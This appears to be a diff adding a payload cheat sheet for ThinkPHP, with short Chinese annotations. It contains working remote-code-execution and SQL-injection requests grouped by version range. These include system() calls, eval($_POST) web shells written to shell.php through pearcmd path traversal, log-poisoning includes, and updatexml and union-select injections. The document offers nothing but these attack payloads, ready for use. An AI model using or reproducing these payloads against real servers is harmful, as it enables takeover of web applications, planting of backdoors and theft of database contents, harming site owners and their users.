@@ -1,0 +1,77 @@
+[+] ThinkPHP 2.x RCE (GET)
+	> http://127.0.0.1/?s=index/index/xxx/${@phpinfo()}
+	> http://127.0.0.1/?s=index/index/xxx/${${system(whoami)}}
+	> http://127.0.0.1/?s=index/index/xxx/${${@eval($_POST[a])}}
+	> http://127.0.0.1/?s=index/\think\module/xxx/${@phpinfo()}
+	> http://127.0.0.1/?s=index/\think\module/xxx/${${system(whoami)}}
+	> http://127.0.0.1/?s=index/\think\module/xxx/${${@eval($_POST[a])}}
+
+[+] ThinkPHP 3.2.x debug关闭 RCE (GET)
+	> http://127.0.0.1/?m=--><?=phpinfo();?>
+	    http://127.0.0.1/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_03.log(根据实际日期来写)
+
+[+] ThinkPHP 3.2.x debug开启 RCE (GET)
+	> http://127.0.0.1/?m=Home&c=Index&a=index&test=--><?=phpinfo();?>
+	    http://127.0.0.1/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/23_02_03.log(根据实际日期来写)
+
+[+] ThinkPHP 5.0.0~5.0.12 debug无关 RCE (POST)
+	> http://127.0.0.1/?s=index/index
+	    s=1&_method=__construct&method=POST&filter[]=phpinfo
+	    s=whoami&_method=__construct&method=POST&filter[]=system
+	    command=whoami&_method=__construct&method=GET&filter[]=system
+	    _method=__construct&method=GET&filter[]=system&get[]=whoami
+	    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami
+	    function=system&command=whoami&_method=filter
+
+[+] ThinkPHP 5.0.13~5.0.23 debug开启 RCE (POST)
+	> http://127.0.0.1/?s=index/index
+	    _method=__construct&filter[]=system&method=GET&get[]=whoami
+	    _method=__construct&filter[]=system&method=GET&get[]=whoami
+	    _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
+	    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami
+
+[+] ThinkPHP 5.0.13~5.0.23 captcha路由 RCE (POST)
+	> http://127.0.0.1/?s=captcha
+	    _method=__construct&filter[]=phpinfo&method=GET&get[]=1
+	    _method=__construct&filter[]=system&method=GET&get[]=whoami
+	    _method=__construct&filter[]=phpinfo&method=GET&server[REQUEST_METHOD]=1
+	    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami
+
+[+] ThinkPHP 5.0.x,5.1.x 未启用强制路由 RCE (GET)
+	> http://127.0.0.1/?s=index/\think\Request/input&filter[]=phpinfo&data=1
+	> http://127.0.0.1/?s=index/\think\Request/input&filter[]=system&data=pwd
+	> http://127.0.0.1/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+	> http://127.0.0.1/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+	> http://127.0.0.1/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+	> http://127.0.0.1/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+	> http://127.0.0.1/?s=index/\think\View/display&content=<?=phpinfo();?>&data=1
+	> http://127.0.0.1/?s=index/\think\View/display&content=<?=system("id");?>&data=1
+	> http://127.0.0.1/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?=phpinfo();?>
+	> http://127.0.0.1/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?=system("id");?>
+
+[+] ThinkPHP 6.0.1~6.0.13,5.0.0~5.0.12,5.1.0~5.1. 多语言RCE
+	> http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php
+	    http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../tmp/1
+	> http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php
+
+[+] ThinkPHP 5.0.13~5.0.15,5.1.0~5.1.5 ParseData方法注入
+	> http://127.0.0.1/index.php/index/index?level[0]=inc&level[1]=updatexml(1,concat(0x7,user(),0x7e),1)&level[2]=1
+
+[+] ThinkPHP 5.1.6~5.1.7 ParseArrayData方法注入
+	> http://127.0.0.1/index.php/index/index?level[0]=point&level[1]=1&level[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&level[3]=0
+
+[+] ThinkPHP 5.0.0~5.0.10 ParseWhereItem方法注入一
+	> http://127.0.0.1/index.php/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#
+	> http://127.0.0.1/index.php/index/index?username[0]=NOT LIKE&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#
+
+[+] ThinkPHP 5All ParseWhereItem方法注入二
+	> http://127.0.0.1/index.php/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)%23
+
+[+] ThinkPHP 5.1.16~5.1.22 OrderBy注入
+	> http://127.0.0.1/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
+
+[+] ThinkPHP 5.0.0~5.0.21 聚合查询注入
+	> http://127.0.0.1/index/index/index?data=id),(updatexml(1,concat(0x7,user(),0x7e),1)%23
+
+[+] ThinkPHP 5.1.11~5.1.25 聚合查询注入
+	> http://127.0.0.1/index/index/index?data=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
